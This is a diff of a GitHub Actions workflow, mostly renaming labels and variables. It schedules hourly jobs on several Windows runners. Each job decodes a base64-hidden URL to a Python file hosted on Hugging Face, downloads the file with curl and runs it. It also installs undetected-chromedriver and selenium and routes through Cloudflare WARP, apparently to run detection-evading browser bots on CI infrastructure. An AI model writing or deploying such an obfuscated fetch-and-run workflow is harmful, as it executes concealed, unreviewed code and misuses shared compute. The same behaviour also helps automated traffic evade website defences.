@@ -1,4 +1,4 @@
-name: Matrix Aut44
+name: Matrix Task Cluster
 
 on:
   workflow_dispatch:
@@ -6,65 +6,65 @@ on:
     - cron: '0 * * * *'
 
 concurrency:
-  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
+  group: pool-group-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  launch-workers:
-    name: "Agent-${{ matrix.node_index }}"
+  run-agents:
+    name: "Worker-${{ matrix.node_id }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        node_id: [1, 2, 3, 4, 5]
 
     steps:
-      - name: System Init & Dependency Setup
+      - name: Environment Bootstrap & Payload Fetch
         shell: bash
         run: |
-          echo "[INITIALIZING] Setting up Worker-${{ matrix.node_index }}..."
+          echo "[BOOTSTRAP] Initializing Node-${{ matrix.node_id }}..."
           
-          # فك تشفير الرابط الجديد وتحميل الملف
-          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          # فك تشفير الرابط المصدر وتنزيل الملف
+          SOURCE_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
-          curl -sL "$REMOTE_SRC" -o app_task.py
+          curl -sL "$SOURCE_URL" -o worker_job.py
           
-          echo "[INITIALIZING] Fetching required packages..."
+          echo "[BOOTSTRAP] Provisioning Python dependencies..."
           python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "[INITIALIZING] Environment setup completed."
+          echo "[BOOTSTRAP] Workspace successfully prepared."
 
-      - name: Execute Script & Monitor Process
+      - name: Launch Application & Monitor Execution
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Output ">>> Launching process on node ${{ matrix.node_index }}..."
+          Write-Output ">>> Spawning Python instance on agent ${{ matrix.node_id }}..."
           
           $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          $ProcessParams = @{
+          $JobOptions = @{
               FilePath     = "python"
-              ArgumentList = "app_task.py"
+              ArgumentList = "worker_job.py"
               PassThru     = $true
               NoNewWindow  = $true
           }
-          $WorkerProc = Start-Process @ProcessParams
+          $SubProcess = Start-Process @JobOptions
           
-          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 74 minutes."
+          Write-Output ">>> Watchdog active. Maximum duration set to 74 minutes."
           
           try {
-              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
-              Write-Output ">>> Process finished execution within limit."
+              Wait-Process -InputObject $SubProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Execution finalized smoothly within the designated time."
           }
           catch {
-              Write-Output ">>> Execution threshold met! Killing process..."
-              Stop-Process -InputObject $WorkerProc -Force
-              Write-Output ">>> Process terminated successfully."
+              Write-Output ">>> Time limit exceeded! Terminating background process..."
+              Stop-Process -InputObject $SubProcess -Force
+              Write-Output ">>> Process forcibly closed by watchdog."
           }
 
-      - name: Completion Status
+      - name: Job Cleanup
         shell: bash
-        run: echo "[COMPLETE] Worker-${{ matrix.node_index }} finished execution cycle."
+        run: echo "[SUMMARY] Node-${{ matrix.node_id }} completed execution pipeline."
